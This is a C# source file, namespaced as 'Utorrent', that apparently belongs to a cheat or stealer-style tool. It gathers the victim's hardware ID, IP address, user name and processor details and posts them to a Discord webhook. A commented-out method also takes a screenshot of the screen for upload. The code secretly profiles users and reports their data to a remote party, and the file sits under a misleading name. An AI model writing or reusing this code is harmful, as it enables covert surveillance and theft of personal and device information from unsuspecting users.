using System;
using System.Collections.Specialized;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Windows.Forms;

namespace Utorrent.Misc
{
    static class SendDiscordWebhook
    {
        public static string temp = Path.GetTempPath();

        public static string HWID = GetInfos.hwid();
        public static string ip = GetInfos.ip();

        public static byte[] post(string url, NameValueCollection pair)
        {
            using (WebClient wc = new WebClient())
            {
                return wc.UploadValues(url, pair);
            }
        }
        private static void send(string url, string message)
        {
            post(url, new System.Collections.Specialized.NameValueCollection()
            {
            {
                "content",
                message
            }
            });
        }

        public static string processador()
        {
            string psn = "Não identificado";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
            ManagementObjectCollection collection = searcher.Get();
            foreach (ManagementObject obj in collection)
            {
                string manufacturer = obj["Name"].ToString();
                psn = manufacturer;
            }
            return psn;
        }


        //public static void log(string webhook, string message, bool print = true)
        //{
        //    if (print)
        //    {
        //        WebClient webClient2 = new WebClient();
        //        Bitmap bitmap = new Bitmap(Screen.
         // Screen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        //        Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
        //        bitmap.Save(temp + "\\logAimbot.png", ImageFormat.Png);
        //        string imagem = temp + "\\logAimbot.png";
        //      //  webClient2.UploadFile(webhook, imagem);
        //        File.Delete(temp + "\\logAimbot.png");
        //    }
        //    string webhookmsg = message + "\n**Processador:** " + processador() + "\n\nPC Name: `" + Environment.UserName + "\n` IP: `" + ip + "` \n HWID: `" + HWID + "`\n Horário: `" + (DateTime.Now) + "`";
        //    send(webhook, webhookmsg);

        //}
    }
}
